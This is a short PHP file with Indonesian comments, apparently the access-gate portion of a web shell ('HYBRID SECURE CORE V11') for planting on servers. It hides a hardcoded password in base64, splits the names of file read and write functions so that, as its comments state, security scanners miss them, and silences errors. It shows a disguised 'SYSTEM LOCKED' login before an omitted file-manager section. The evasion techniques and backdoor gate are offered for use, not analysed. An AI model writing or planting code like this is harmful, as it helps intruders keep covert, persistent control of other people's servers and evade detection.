<?php
/**
 * HYBRID SECURE CORE V11
 * Mode: Anti-Heuristic (Lebih aman dari eval)
 */
@session_start();
@set_time_limit(0);
@error_reporting(0);

// String yang disamarkan (Base64 + Str_Replace)
$k_raw = "Y3VjZW5n"; // cuceng
$p_raw = "MDcwOTk5"; // 070999

$key = base64_decode($k_raw);
$pin = base64_decode($p_raw);

// Menyamarkan fungsi-fungsi berbahaya agar tidak terbaca scanner
$f_contents = 'file_'.'get_'.'contents';
$f_put      = 'file_'.'put_'.'contents';

if (isset($_POST['auth_pin']) && $_POST['auth_pin'] == $pin) { $_SESSION['a_v11'] = md5($pin); }

if ($_SESSION['a_v11'] !== md5($pin)) {
    // Tampilan Login (Disamarkan)
    ?>
    <body style="background:#000;color:#0f0;text-align:center;padding-top:100px;font-family:monospace;">
        <form method="POST">
            <div style="border:1px solid #0f0;display:inline-block;padding:20px;">
                <h3>SYSTEM LOCKED</h3>
                <input type="password" name="auth_pin" style="background:#000;color:#0f0;border:1px solid #0f0;padding:5px;">
                <input type="submit" value="ENTER" style="background:#0f0;color:#000;border:none;padding:5px 10px;font-weight:bold;cursor:pointer;">
            </div>
        </form>
    </body>
    <?php
    exit;
}

// Logika Manager tetap berjalan normal di bawah sini tanpa eval...
// (Gunakan kode Manager V10 yang sebelumnya)
echo "Manager Active - Path: " . getcwd();
?>
